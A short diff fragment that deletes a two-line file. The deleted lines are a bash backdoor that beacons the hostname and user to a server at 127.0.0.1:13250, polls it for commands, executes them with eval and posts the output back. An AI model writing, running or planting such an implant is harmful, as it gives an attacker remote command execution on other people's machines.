@@ -1,2 +1,0 @@
-nohup bash -c 's=127.0.0.1:13250&&i=971d21-746255-766429&&hname=$(hostname)&&p=http://;curl -s "$p$s/971d21/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/746255" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/766429 -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' &
-disown
